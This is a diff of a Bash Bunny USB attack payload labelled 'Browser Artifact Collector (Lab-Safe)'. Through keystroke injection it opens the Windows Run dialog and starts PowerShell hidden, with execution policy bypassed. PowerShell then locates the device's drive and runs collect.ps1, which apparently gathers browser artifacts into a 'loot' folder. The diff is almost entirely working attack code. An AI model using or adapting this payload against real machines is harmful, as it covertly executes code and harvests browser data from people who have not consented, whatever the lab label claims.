@@ -1,50 +1,38 @@
 #!/bin/bash
-
-# --------------------------
-#   Browser Collector Payload
-# --------------------------
+# Browser Artifact Collector Payload (Lab-Safe)
 
 LED SETUP
 
-# Expose Bash Bunny storage to target
-ATTACKMODE STORAGE
-sleep 5   # allow Windows to mount the drive
+# ---------------------------------------------
+# Configure attack modes
+# ---------------------------------------------
+ATTACKMODE HID STORAGE    # HID to inject commands, STORAGE to mount loot
+sleep 6                   # allow Windows to mount storage
 
 
 # ---------------------------------------------
-# Determine where the Bunny storage is mounted
+# Copy collect.ps1 to the Bunny storage
 # ---------------------------------------------
-BUNNY_DRIVE=""
-for drive in /mnt/*; do
-    if [ -d "$drive/loot" ]; then
-        BUNNY_DRIVE="$drive"
-        break
-    fi
-done
-
-if [ -z "$BUNNY_DRIVE" ]; then
-    LED FAIL
-    exit
-fi
+cp /root/udisk/payloads/$SWITCH_POSITION/collect.ps1 /root/udisk/loot/collect.ps1
 
 
 # ---------------------------------------------
-# Copy collect.ps1 into the Bunny storage
+# Launch PowerShell with admin-friendly behavior
 # ---------------------------------------------
-cp /root/udisk/payloads/$SWITCH_POSITION/collect.ps1 "$BUNNY_DRIVE/collect.ps1"
-
-
 LED ATTACK
 
-# ---------------------------------------------
-# Execute collect.ps1 on the target system
-# ---------------------------------------------
-QUACK STRING "powershell -ExecutionPolicy Bypass -NoP -W Hidden -File \"$BUNNY_DRIVE\\collect.ps1\""
+# Open Run dialog
+QUACK GUI r
+sleep 0.3
+
+# Launch PowerShell hidden and run the script
+QUACK STRING 'powershell -ExecutionPolicy Bypass -NoP -W Hidden -Command "$d=Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DriveType -eq 2 -and (Test-Path (Join-Path $_.DeviceID \"loot\")) } | Select-Object -ExpandProperty DeviceID; & (Join-Path $d \"loot\\collect.ps1\")"'
 QUACK ENTER
 
 
-# Optional delay (adjust if needed)
-sleep 20
-
+# ---------------------------------------------
+# Allow script time to finish
+# ---------------------------------------------
+sleep 25
 
 LED FINISH
